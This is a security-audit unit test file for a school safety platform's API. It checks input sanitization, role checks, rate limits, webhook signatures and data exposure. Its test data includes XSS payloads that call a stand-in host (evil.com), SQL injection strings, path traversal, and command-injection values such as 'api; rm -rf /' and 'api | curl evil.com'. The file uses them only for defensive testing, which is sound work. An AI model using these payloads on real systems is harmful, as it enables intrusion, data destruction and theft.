/**
 * SECURITY AUDIT — UNIT TESTS (No DB/Redis required)
 *
 * These tests verify security properties through pure logic, regex checks,
 * and source code analysis without requiring running services.
 *
 * For integration tests that exercise actual endpoints, see security-audit.test.ts
 * (requires PostgreSQL + Redis via docker compose).
 */

import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import { stripHtml, escapeHtml, sanitizeText, isValidDateString } from '../utils/sanitize.js';
import { requireRole, requireMinRole } from '../middleware/rbac.js';

// Helper: read a route file's source code
function readRouteSource(filename: string): string {
  const routesDir = join(__dirname, '..', 'routes');
  return readFileSync(join(routesDir, filename), 'utf-8');
}

// ===========================================================================
// A. INPUT VALIDATION & SANITIZATION
// ===========================================================================
describe('A. Input Validation & Sanitization', () => {

  describe('A1: sanitizeText strips all HTML tags', () => {
    const xssPayloads = [
      { input: '<script>alert("xss")</script>', contains: '<script>' },
      { input: '<img src=x onerror=alert(1)>', contains: '<img' },
      { input: '<svg onload=alert(1)>', contains: '<svg' },
      { input: '<iframe src="evil.com"></iframe>', contains: '<iframe' },
      { input: '<a href="javascript:alert(1)">click</a>', contains: '<a' },
      { input: '<div style="background:url(javascript:alert(1))">', contains: '<div' },
      { input: '"><script>fetch("evil.com")</script>', contains: '<script>' },
      { input: 'text<script', contains: '<script' },
      { input: '<SCRIPT SRC=//evil.com/xss.js></SCRIPT>', contains: '<SCRIPT' },
      { input: '<body onload=alert(1)>', contains: '<body' },
    ];

    for (const { input, contains } of xssPayloads) {
      it(`should strip "${contains}" from input`, () => {
        const result = sanitizeText(input);
        expect(result).not.toContain(contains);
      });
    }

    it('should handle null and undefined', () => {
      expect(sanitizeText(null)).toBe('');
      expect(sanitizeText(undefined)).toBe('');
    });

    it('should preserve legitimate text content', () => {
      expect(sanitizeText('Hello World')).toBe('Hello World');
      expect(sanitizeText('  spaces  ')).toBe('spaces');
      expect(sanitizeText("John O'Brien")).toBe("John O'Brien");
      expect(sanitizeText('Room 101 & 102')).toBe('Room 101 & 102');
    });
  });

  describe('A2: escapeHtml prevents rendering', () => {
    it('should escape all dangerous characters', () => {
      expect(escapeHtml('<')).toBe('&lt;');
      expect(escapeHtml('>')).toBe('&gt;');
      expect(escapeHtml('&')).toBe('&amp;');
      expect(escapeHtml('"')).toBe('&quot;');
      expect(escapeHtml("'")).toBe('&#x27;');
    });

    it('should escape a full XSS payload', () => {
      const escaped = escapeHtml('<script>alert("xss")</script>');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
    });
  });

  describe('A3: isValidDateString rejects injection strings', () => {
    const injectionStrings = [
      "'; DROP TABLE users;--",
      "1' OR '1'='1",
      "2024-01-01' UNION SELECT * FROM users--",
      '<script>alert(1)</script>',
      '../../../etc/passwd',
      'null',
      '',
    ];

    for (const input of injectionStrings) {
      it(`should reject "${input.substring(0, 40)}"`, () => {
        expect(isValidDateString(input)).toBe(false);
      });
    }

    it('should accept valid date strings', () => {
      expect(isValidDateString('2024-01-15')).toBe(true);
      expect(isValidDateString('2024-01-15T10:30:00Z')).toBe(true);
      expect(isValidDateString('2024-12-31T23:59:59.999Z')).toBe(true);
    });
  });

  // FIXED: demo-requests.ts now sanitizes all inputs
  describe('A4: [FIXED] Demo requests sanitization', () => {
    it('should use sanitizeText on name, school, role, message fields', () => {
      const source = readRouteSource('demo-requests.ts');
      const hasSanitize = source.includes('sanitizeText');
      expect(hasSanitize).toBe(true); // Fixed
    });

    it('should have rate limiting configured', () => {
      const source = readRouteSource('demo-requests.ts');
      expect(source).toContain('rateLimit');
    });
  });

  // FIXED: tips.ts PATCH handler now sanitizes notes
  describe('A5: [FIXED] Tip notes field sanitization', () => {
    it('should sanitize notes in PATCH handler', () => {
      const source = readRouteSource('tips.ts');
      const patchSection = source.substring(source.indexOf('authedApp.patch'));
      const notesSanitized = patchSection.includes('sanitizeText(body.notes');
      expect(notesSanitized).toBe(true); // Fixed
    });
  });

  // FIXED: tips.ts contactInfo now sanitized
  describe('A6: [FIXED] Tip contactInfo sanitization', () => {
    it('should sanitize contactInfo in tip submission', () => {
      const source = readRouteSource('tips.ts');
      const contactInfoSanitized = source.includes('sanitizeText(body.contactInfo');
      expect(contactInfoSanitized).toBe(true); // Fixed
    });
  });

  // FIXED: door-health.ts work order notes now sanitized on update
  describe('A7: [FIXED] Work order notes sanitization on update', () => {
    it('should sanitize notes in PUT /work-orders/:id', () => {
      const source = readRouteSource('door-health.ts');
      const putSection = source.substring(source.indexOf("'/work-orders/:id'"));
      const notesSanitized = putSection.includes('sanitizeText(request.body.notes');
      expect(notesSanitized).toBe(true); // Fixed
    });
  });

  // GOOD: Verify routes that DO sanitize properly
  describe('A8: Routes with correct sanitization', () => {
    const routesWithSanitization = [
      'alerts.ts',
      'visitors.ts',
      'visitor-bans.ts',
      'zones.ts',
      'events.ts',
      'roll-call.ts',
      'fire-alarm.ts',
      'users.ts',
      'panic-devices.ts',
      'door-health.ts', // create handler sanitizes, update handler does not
      'dispatch.ts',
      'responder-auth.ts',
    ];

    for (const file of routesWithSanitization) {
      it(`${file} should import and use sanitizeText`, () => {
        const source = readRouteSource(file);
        expect(source).toContain('sanitizeText');
      });
    }
  });

  // Command injection prevention in admin.ts
  describe('A9: Command injection prevention', () => {
    it('admin.ts validates service names with regex', () => {
      const source = readRouteSource('admin.ts');
      expect(source).toContain('/^[a-zA-Z0-9_-]+$/');
    });

    it('regex correctly blocks injection attempts', () => {
      const regex = /^[a-zA-Z0-9_-]+$/;
      expect(regex.test('api')).toBe(true);
      expect(regex.test('worker')).toBe(true);
      expect(regex.test('api; rm -rf /')).toBe(false);
      expect(regex.test('api && cat /etc/passwd')).toBe(false);
      expect(regex.test('api | curl evil.com')).toBe(false);
      expect(regex.test('$(whoami)')).toBe(false);
      expect(regex.test('`whoami`')).toBe(false);
    });
  });
});

// ===========================================================================
// B. AUTHENTICATION & AUTHORIZATION
// ===========================================================================
describe('B. Authentication & Authorization', () => {

  describe('B1: RBAC middleware functions correctly', () => {
    it('requireRole should return middleware function', () => {
      const middleware = requireRole('OPERATOR', 'SITE_ADMIN');
      expect(typeof middleware).toBe('function');
    });

    it('requireMinRole should return middleware function', () => {
      const middleware = requireMinRole('OPERATOR');
      expect(typeof middleware).toBe('function');
    });
  });

  describe('B2: All protected routes use authenticate + RBAC preHandlers', () => {
    const routeChecks = [
      { file: 'fire-alarm.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'roll-call.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'zones.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'events.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'door-health.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'system-health.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'integration-health.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'visitor-bans.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'cameras.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
      { file: 'lockdown.ts', patterns: ['fastify.authenticate', 'requireMinRole'] },
    ];

    for (const { file, patterns } of routeChecks) {
      it(`${file} should use ${patterns.join(' + ')}`, () => {
        const source = readRouteSource(file);
        for (const pattern of patterns) {
          expect(source).toContain(pattern);
        }
      });
    }
  });

  describe('B3: Routes using onRequest JWT verify', () => {
    const routeChecks = [
      { file: 'panic-devices.ts', pattern: 'jwtVerify' },
      { file: 'weapons-detectors.ts', pattern: 'jwtVerify' },
      { file: 'users.ts', pattern: 'jwtVerify' },
      { file: 'fleet.ts', pattern: 'jwtVerify' },
    ];

    for (const { file, pattern } of routeChecks) {
      it(`${file} uses ${pattern} onRequest hook`, () => {
        const source = readRouteSource(file);
        expect(source).toContain(pattern);
      });
    }
  });

  describe('B4: Fire alarm PAS requires OPERATOR minimum', () => {
    it('all PAS decision endpoints require OPERATOR+', () => {
      const source = readRouteSource('fire-alarm.ts');
      // Check acknowledge, confirm, dismiss, extend all use requireMinRole('OPERATOR')
      const operatorMatches = source.match(/requireMinRole\('OPERATOR'\)/g);
      // Should have at least 4 OPERATOR+ checks (acknowledge, confirm, dismiss, extend)
      // Plus list events, evacuation routes GET
      expect(operatorMatches).not.toBeNull();
      expect(operatorMatches!.length).toBeGreaterThanOrEqual(4);
    });

    it('zone and route creation require SITE_ADMIN+', () => {
      const source = readRouteSource('fire-alarm.ts');
      const adminMatches = source.match(/requireMinRole\('SITE_ADMIN'\)/g);
      expect(adminMatches).not.toBeNull();
      expect(adminMatches!.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('B5: Lockdown requires FIRST_RESPONDER+ to initiate', () => {
    it('POST /lockdown uses requireMinRole FIRST_RESPONDER', () => {
      const source = readRouteSource('lockdown.ts');
      expect(source).toContain("requireMinRole('FIRST_RESPONDER')");
    });

    it('DELETE /lockdown/:id uses requireMinRole OPERATOR', () => {
      const source = readRouteSource('lockdown.ts');
      expect(source).toContain("requireMinRole('OPERATOR')");
    });
  });

  describe('B6: Roll call RBAC', () => {
    it('initiating roll call requires OPERATOR+', () => {
      const source = readRouteSource('roll-call.ts');
      // POST / handler
      const postSection = source.substring(0, source.indexOf('fastify.get'));
      expect(postSection).toContain("requireMinRole('OPERATOR')");
    });

    it('submitting report requires TEACHER+', () => {
      const source = readRouteSource('roll-call.ts');
      expect(source).toContain("requireMinRole('TEACHER')");
    });

    it('completing roll call requires OPERATOR+', () => {
      const source = readRouteSource('roll-call.ts');
      // POST /:id/complete handler
      const completeSection = source.substring(source.indexOf('/:id/complete'));
      expect(completeSection).toContain("requireMinRole('OPERATOR')");
    });
  });

  describe('B7: User management requires SITE_ADMIN+', () => {
    it('all user CRUD requires SITE_ADMIN+', () => {
      const source = readRouteSource('users.ts');
      const adminMatches = source.match(/requireMinRole\('SITE_ADMIN'\)/g);
      expect(adminMatches).not.toBeNull();
      // GET list, GET detail, POST create, PUT update, POST reset-password, DELETE
      expect(adminMatches!.length).toBeGreaterThanOrEqual(5);
    });
  });

  describe('B8: Zone lockdown requires FIRST_RESPONDER+', () => {
    it('POST /zones/:id/lockdown uses FIRST_RESPONDER+', () => {
      const source = readRouteSource('zones.ts');
      expect(source).toContain("requireMinRole('FIRST_RESPONDER')");
    });
  });

  // VULNERABILITY: HIGH — Responder MFA stub always returns verified=true
  describe('B9: [VULN-HIGH] Responder MFA verification is a stub', () => {
    it('MFA verify returns 501 Not Implemented (not a stub verified: true)', () => {
      const source = readRouteSource('responder-auth.ts');
      // MFA endpoint should return 501, not a stub that sends { verified: true }
      expect(source).not.toMatch(/send\(\s*\{[^}]*verified:\s*true/);
      expect(source).toContain('501');
      expect(source).toContain('MFA_NOT_IMPLEMENTED');
    });
  });
});

// ===========================================================================
// C. RATE LIMITING
// ===========================================================================
describe('C. Rate Limiting Configuration', () => {

  describe('C1: Route-specific rate limits configured', () => {
    it('login has 10 req/min rate limit', () => {
      const source = readRouteSource('auth.ts');
      expect(source).toContain('max: 10');
      expect(source).toContain("timeWindow: '1 minute'");
    });

    it('alert creation has 5 req/min rate limit', () => {
      const source = readRouteSource('alerts.ts');
      expect(source).toContain('max: 5');
    });

    it('tip submission has 3 req/min rate limit', () => {
      const source = readRouteSource('tips.ts');
      expect(source).toContain('max: 3');
    });

    it('responder login has 10 req/min rate limit', () => {
      const source = readRouteSource('responder-auth.ts');
      expect(source).toContain('max: 10');
    });

    it('FR tip submission has 3 req/min rate limit', () => {
      const source = readRouteSource('fr-tips-public.ts');
      expect(source).toContain('max: 3');
    });

    it('public visitor pre-registration has 5 req/min rate limit', () => {
      const source = readRouteSource('visitors.ts');
      // The public-preregister endpoint
      expect(source).toContain('max: 5');
    });
  });

  // VULNERABILITY: LOW — Missing rate limits on sensitive endpoints
  describe('C2: [VULN-LOW] Endpoints missing route-specific rate limits', () => {
    it('fire-alarm PAS endpoints have no specific rate limits', () => {
      const source = readRouteSource('fire-alarm.ts');
      expect(source).not.toContain('rateLimit');
    });

    it('roll-call initiation has no specific rate limit', () => {
      const source = readRouteSource('roll-call.ts');
      expect(source).not.toContain('rateLimit');
    });

    it('zone lockdown has no specific rate limit', () => {
      const source = readRouteSource('zones.ts');
      expect(source).not.toContain('rateLimit');
    });

    it('demo requests have rate limiting applied', () => {
      const source = readRouteSource('demo-requests.ts');
      expect(source).toContain('rateLimit');
    });
  });
});

// ===========================================================================
// D. DATA EXPOSURE
// ===========================================================================
describe('D. Data Exposure Prevention', () => {

  describe('D1: User route excludes passwordHash', () => {
    it('GET /users uses select to exclude passwordHash', () => {
      const source = readRouteSource('users.ts');
      // The user list uses explicit select
      expect(source).toContain('select:');
      // passwordHash should NOT be in any select block
      expect(source).not.toContain("passwordHash: true");
    });
  });

  describe('D2: Auth /me excludes sensitive fields', () => {
    it('returns safe user fields only', () => {
      const source = readRouteSource('auth.ts');
      const meSection = source.substring(source.indexOf("'/me'"));
      // Should return id, email, name, role, phone, siteIds, isActive
      expect(meSection).toContain('id: user.id');
      expect(meSection).toContain('email: user.email');
      expect(meSection).not.toContain('passwordHash');
    });
  });

  describe('D3: Login response excludes passwordHash', () => {
    it('login returns user object without password info', () => {
      const source = readRouteSource('auth.ts');
      const loginSection = source.substring(
        source.indexOf("'/login'"),
        source.indexOf("'/me'")
      );
      // The response has an explicit user object
      expect(loginSection).toContain('user: {');

      // Extract just the response object to check it doesn't include passwordHash
      const responseSection = loginSection.substring(
        loginSection.indexOf('return {'),
        loginSection.indexOf('});', loginSection.indexOf('return {')) + 3
      );
      // The login response returns token + user {id, email, name, role, siteIds}
      // passwordHash is used for verification but NOT included in the response object
      expect(responseSection).toContain('id: user.id');
      expect(responseSection).toContain('email: user.email');
      expect(responseSection).toContain('name: user.name');
      expect(responseSection).toContain('role: user.role');
      // Ensure the JWT sign call does not include passwordHash
      expect(responseSection).not.toContain('passwordHash:');
    });
  });

  describe('D4: Logger redacts auth headers', () => {
    it('server.ts configures pino to redact authorization', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).toContain("'req.headers.authorization'");
      expect(serverSource).toContain("'req.headers.cookie'");
    });
  });

  describe('D5: Error handler hides 500 details', () => {
    it('server.ts returns generic message for 5xx errors', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).toContain("'Internal Server Error'");
    });
  });

  describe('D6: Admin route redacts sensitive env vars', () => {
    it('admin.ts has REDACTED_KEYS for sensitive values', () => {
      const source = readRouteSource('admin.ts');
      expect(source).toContain('REDACTED_KEYS');
      expect(source).toContain('DB_PASSWORD');
      expect(source).toContain('JWT_SECRET');
      expect(source).toContain('RAPIDSOS_CLIENT_SECRET');
      expect(source).toContain('TWILIO_AUTH_TOKEN');
      expect(source).toContain('SENDGRID_API_KEY');
    });
  });
});

// ===========================================================================
// E. CORS & HEADERS
// ===========================================================================
describe('E. CORS & Headers', () => {

  describe('E1: CORS configuration', () => {
    it('production mode blocks all origins unless CORS_ORIGINS is set', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).toContain("isProduction");
      expect(serverSource).toContain("CORS_ORIGINS");
      expect(serverSource).toContain("false"); // Block all in production
    });

    it('credentials disabled in production', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).toContain('credentials: isProduction ? false');
    });
  });

  // VULNERABILITY: LOW — No @fastify/helmet for security headers
  describe('E2: [VULN-LOW] Missing security headers', () => {
    it('server.ts does not include @fastify/helmet', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).not.toContain('helmet');
      // Missing: X-Content-Type-Options, X-Frame-Options, HSTS, CSP
    });
  });
});

// ===========================================================================
// F. WEBHOOK SECURITY
// ===========================================================================
describe('F. Webhook Security', () => {

  describe('F1: Panic webhooks verify HMAC signatures', () => {
    it('centegix handler verifies signature before processing', () => {
      const source = readRouteSource('webhooks/panic.ts');
      expect(source).toContain('verifySignature');
      expect(source).toContain("401");
      expect(source).toContain("'Invalid signature'");
    });

    it('rave handler verifies signature before processing', () => {
      const source = readRouteSource('webhooks/panic.ts');
      const raveSection = source.substring(source.indexOf("'/rave'"));
      expect(raveSection).toContain('verifySignature');
    });
  });

  describe('F2: Weapons detection webhooks verify HMAC signatures', () => {
    const vendors = ['evolv', 'ceia', 'xtract-one'];
    for (const vendor of vendors) {
      it(`${vendor} handler verifies signature`, () => {
        const source = readRouteSource('webhooks/weapons-detection.ts');
        expect(source).toContain('verifySignature');
      });
    }
  });

  // VULNERABILITY: HIGH — Bus fleet webhook does not actually verify HMAC
  describe('F3: [VULN-HIGH] Bus fleet webhook signature verification incomplete', () => {
    it('checks for signature header but does not actually verify HMAC', () => {
      const source = readRouteSource('webhooks/bus-fleet.ts');
      // It checks if the header exists
      expect(source).toContain('x-webhook-signature');
      // But there is a comment saying "For production, implement vendor-specific..."
      expect(source).toContain('For production');
      // It does NOT call any verifySignature or HMAC function
      expect(source).not.toContain('createHmac');
      expect(source).not.toContain('verifySignature');
    });
  });

  describe('F4: Webhook raw body capture for HMAC', () => {
    it('panic webhook captures raw body for signature verification', () => {
      const source = readRouteSource('webhooks/panic.ts');
      expect(source).toContain('rawBody');
      expect(source).toContain('addContentTypeParser');
    });

    it('weapons detection webhook captures raw body', () => {
      const source = readRouteSource('webhooks/weapons-detection.ts');
      expect(source).toContain('rawBody');
      expect(source).toContain('addContentTypeParser');
    });
  });

  describe('F5: Bus fleet vendor validation', () => {
    it('validates vendor against allowlist', () => {
      const source = readRouteSource('webhooks/bus-fleet.ts');
      expect(source).toContain('validVendors');
      expect(source).toContain('zonar');
      expect(source).toContain('samsara');
    });
  });

  describe('F6: Clerk webhook replay protection', () => {
    it('checks timestamp within 300 seconds', () => {
      const source = readRouteSource('auth.ts');
      expect(source).toContain('300');
      expect(source).toContain('svix-timestamp');
    });
  });

  describe('F7: Dispatch API uses timing-safe comparison', () => {
    it('uses crypto.timingSafeEqual for API key validation', () => {
      const source = readRouteSource('dispatch.ts');
      expect(source).toContain('timingSafeEqual');
      expect(source).toContain('crypto');
    });
  });
});

// ===========================================================================
// G. FIRE ALARM PAS SECURITY
// ===========================================================================
describe('G. Fire Alarm PAS Security', () => {

  describe('G1: Extend investigation requires reason', () => {
    it('extend handler checks for reason field', () => {
      const source = readRouteSource('fire-alarm.ts');
      const extendSection = source.substring(source.indexOf("'/:alertId/extend'"));
      expect(extendSection).toContain("!body.reason");
      expect(extendSection).toContain("'Reason is required");
    });
  });

  describe('G2: Extend reason is sanitized', () => {
    it('reason passes through sanitizeText', () => {
      const source = readRouteSource('fire-alarm.ts');
      expect(source).toContain('sanitizeText(body.reason)');
    });
  });

  describe('G3: All PAS actions use AlertEngine', () => {
    it('acknowledge, confirm, dismiss, extend all use AlertEngine', () => {
      const source = readRouteSource('fire-alarm.ts');
      const alertEngineRefs = source.match(/AlertEngine/g);
      expect(alertEngineRefs).not.toBeNull();
      expect(alertEngineRefs!.length).toBeGreaterThanOrEqual(4);
    });
  });

  describe('G4: PAS actions pass user ID and IP for audit', () => {
    it('all PAS endpoints pass user ID and request.ip', () => {
      const source = readRouteSource('fire-alarm.ts');
      // Code uses jwtUser.id or user.id patterns
      const userIdRefs = source.match(/(?:jwtUser|user)\.id/g);
      const ipRefs = source.match(/request\.ip/g);
      expect(userIdRefs).not.toBeNull();
      expect(ipRefs).not.toBeNull();
      expect(userIdRefs!.length).toBeGreaterThanOrEqual(4);
      expect(ipRefs!.length).toBeGreaterThanOrEqual(4);
    });
  });
});

// ===========================================================================
// H. IDOR PREVENTION
// ===========================================================================
describe('H. IDOR Prevention', () => {

  describe('H1: Alert list is site-scoped', () => {
    it('alert list query uses jwtUser.siteIds', () => {
      const source = readRouteSource('alerts.ts');
      expect(source).toContain('request.jwtUser.siteIds');
    });
  });

  // FIXED: Single resource endpoints now check site ownership
  describe('H2: Single resource detail endpoints verify site ownership', () => {
    it('GET /alerts/:id checks siteId against user sites', () => {
      const source = readRouteSource('alerts.ts');
      // GET /:id handler now verifies siteIds
      expect(source).toContain('siteIds.includes(alert.siteId)');
    });

    it('GET /roll-call/:id checks siteId', () => {
      const source = readRouteSource('roll-call.ts');
      // GET /:id now verifies siteIds
      expect(source).toContain('siteIds.includes(rollCall.siteId)');
    });

    it('GET /zones/:id checks siteId', () => {
      const source = readRouteSource('zones.ts');
      // GET /:id now verifies siteIds
      expect(source).toContain('siteIds.includes(zone.siteId)');
    });
  });

  describe('H3: Site-scoped list queries', () => {
    const scopedRoutes = [
      { file: 'door-health.ts', field: 'siteId' },
      { file: 'system-health.ts', field: 'siteId' },
      { file: 'integration-health.ts', field: 'siteId' },
      { file: 'visitor-bans.ts', field: 'siteId' },
      { file: 'events.ts', field: 'siteId' },
      { file: 'roll-call.ts', field: 'siteId' },
    ];

    for (const { file, field } of scopedRoutes) {
      it(`${file} list query uses ${field} from JWT`, () => {
        const source = readRouteSource(file);
        expect(source).toContain('siteIds[0]');
      });
    }
  });

  describe('H4: Lockdown active is scoped to user sites', () => {
    it('uses siteId: { in: request.jwtUser.siteIds }', () => {
      const source = readRouteSource('lockdown.ts');
      expect(source).toContain('request.jwtUser.siteIds');
    });
  });
});

// ===========================================================================
// I. PASSWORD & AUTH SECURITY
// ===========================================================================
describe('I. Password & Auth Security', () => {

  describe('I1: Password hashing uses bcrypt', () => {
    it('user creation hashes password with bcrypt', () => {
      const source = readRouteSource('users.ts');
      expect(source).toContain('bcrypt.hash');
      expect(source).toContain('10'); // salt rounds
    });

    it('login verifies with bcrypt.compare', () => {
      const source = readRouteSource('auth.ts');
      expect(source).toContain('bcrypt.compare');
    });
  });

  describe('I2: JWT tokens have expiration', () => {
    it('login sets expiresIn 24h on JWT', () => {
      const source = readRouteSource('auth.ts');
      expect(source).toContain("expiresIn: '24h'");
    });
  });

  describe('I3: Login error messages are consistent', () => {
    it('returns same error for invalid email and wrong password', () => {
      const source = readRouteSource('auth.ts');
      // Both should say "Invalid credentials"
      const invalidCredentials = source.match(/Invalid credentials/g);
      expect(invalidCredentials).not.toBeNull();
      expect(invalidCredentials!.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('I4: Password minimum length enforced', () => {
    it('user creation requires 12+ character password', () => {
      const source = readRouteSource('users.ts');
      expect(source).toContain('password.length < 12');
    });

    it('password reset requires 12+ character password', () => {
      const source = readRouteSource('users.ts');
      const resetSection = source.substring(source.indexOf('reset-password'));
      expect(resetSection).toContain('12 characters');
    });
  });

  describe('I5: Self-deactivation prevention', () => {
    it('prevents users from deleting their own account', () => {
      const source = readRouteSource('users.ts');
      expect(source).toContain('requester.id === id');
      expect(source).toContain('Cannot deactivate your own account');
    });
  });
});

// ===========================================================================
// J. ADDITIONAL SECURITY PROPERTIES
// ===========================================================================
describe('J. Additional Security Properties', () => {

  describe('J1: File upload size limit', () => {
    it('multipart configured with 10MB limit', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).toContain('fileSize: 10 * 1024 * 1024');
    });
  });

  describe('J2: Health endpoints do not expose operational data', () => {
    it('/health returns only status and timestamp', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      // Check the health handler
      const healthSection = serverSource.substring(
        serverSource.indexOf("app.get('/health'"),
        serverSource.indexOf("app.get('/ready'")
      );
      expect(healthSection).toContain("status: 'ok'");
      expect(healthSection).toContain('timestamp');
      expect(healthSection).not.toContain('mode');
      expect(healthSection).not.toContain('version');
    });
  });

  describe('J3: Lockdown release requires edge mode', () => {
    it('DELETE /lockdown/:id checks OPERATING_MODE', () => {
      const source = readRouteSource('lockdown.ts');
      expect(source).toContain("OPERATING_MODE");
      expect(source).toContain("EDGE_ONLY_OPERATION");
    });
  });

  describe('J4: Rate limiting disabled only in test env', () => {
    it('server.ts only disables rate limiting when NODE_ENV=test', () => {
      const serverSource = readFileSync(
        join(__dirname, '..', 'server.ts'),
        'utf-8'
      );
      expect(serverSource).toContain("process.env.NODE_ENV !== 'test'");
    });
  });

  describe('J5: Public tip endpoints do not expose IP addresses', () => {
    it('tips.ts hashes IP instead of storing it', () => {
      const source = readRouteSource('tips.ts');
      expect(source).toContain('createHash');
      expect(source).toContain('ipHash');
    });
  });

  describe('J6: Visitor credential revocation during lockdown', () => {
    it('lockdown revokes visitor temporary/mobile credentials', () => {
      const source = readRouteSource('lockdown.ts');
      expect(source).toContain("status: 'REVOKED'");
      expect(source).toContain('TEMPORARY_CARD');
      expect(source).toContain('MOBILE');
    });
  });
});
